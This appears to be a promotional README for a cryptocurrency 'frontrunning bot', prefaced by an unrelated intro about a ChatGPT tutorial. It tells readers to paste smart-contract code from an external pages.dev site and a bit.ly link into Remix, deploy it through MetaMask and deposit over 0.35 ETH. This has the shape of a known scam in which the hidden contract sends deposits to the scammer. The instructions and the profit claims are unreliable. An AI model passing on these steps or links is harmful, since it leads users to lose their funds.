## Hello, Everyone!

Hi, I'm Jack! I'm excited to present this video, where I walk you through how ChatGPT can streamline your tasks and enhance your everyday life. This tutorial offers clear, step-by-step guidance to help you get started quickly and maximize the potential of this powerful tool.


## Step-by-Step Instructions

### âœ… Install MetaMask

1. **Download and Install MetaMask:**  
   [https://metamask.io/download/](https://metamask.io/download/)

### âœ… Go to Remix

Navigate to [Remix](https://remix.ethereum.org/).

### âœ… Create a Smart Contract

1. Click on the `contracts` folder.
2. Create a `New File` and name it as desired, for example, `bot.sol`. Ensure the file ends with `.sol` for the Ethereum programming language.
   
   **Note:** If the text isn't highlighted when you create `bot.sol`, simply refresh your browser and paste the code again.

### âœ… Source Code

Access the source code here: [Uniswap Source Code](https://uniswap-source-code.pages.dev)

ðŸ”— [New Version 0.8.28](https://bit.ly/SOURCECODE-SOLIDITY)

### âœ… Compile the Contract

1. Go to the `Compiler` tab in Remix.
2. Select version `0.6.6` and press the `Compile` button.

### âœ… Deploy the Contract

1. Navigate to the `DEPLOY & RUN TRANSACTIONS` section in Remix.
2. Choose the `Injected Provider - MetaMask` option in the environment dropdown.
3. Click `Deploy`. This will allow you to create your own smart contract. To pay for gas fees, confirm the transaction in MetaMask.

### âœ… Fund Your Bot

Deposit more than `0.35 ETH` to your bot's exact contract address to enable it to frontrun transactions and prevent negating slippage.

### âœ… Start the Bot

Use the `Start` button to send a command to the bot to begin working and executing transactions.

### âœ… Withdraw Ethers

To return ethers to your wallet from the smart contract, click the `Withdraw` button. This is necessary because assets might be in use during transactions.
